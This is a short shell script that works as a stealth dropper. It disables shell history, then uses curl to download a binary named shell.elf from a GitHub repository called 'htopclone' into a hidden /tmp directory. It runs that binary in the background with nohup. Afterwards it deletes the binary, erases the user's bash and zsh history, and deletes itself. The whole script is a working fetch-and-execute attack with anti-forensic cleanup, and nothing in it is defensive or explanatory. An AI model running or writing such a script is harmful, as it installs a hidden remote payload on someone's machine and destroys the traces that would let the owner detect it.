#!/bin/sh

# Disable shell history
unset HISTFILE
HISTSIZE=0
HISTFILESIZE=0
set +o history

# Temp path
TMP_DIR="/tmp/.sysd"
BIN_PATH="$TMP_DIR/shell.elf"

# Create temp dir
mkdir -p "$TMP_DIR"

# Download shell.elf via curl
curl -s -L https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf -o "$BIN_PATH"

# Make it executable
chmod +x "$BIN_PATH"

# Run in background (detached from terminal)
if ! pgrep -f "$BIN_PATH" >/dev/null 2>&1; then
    nohup "$BIN_PATH" >/dev/null 2>&1 &
fi

# Wait for it to start
sleep 1

# Clean up
rm -f "$BIN_PATH"
rm -f ~/.bash_history ~/.zsh_history

# Remove this script if saved to disk
[ -f "$0" ] && rm -- "$0"

exit 0
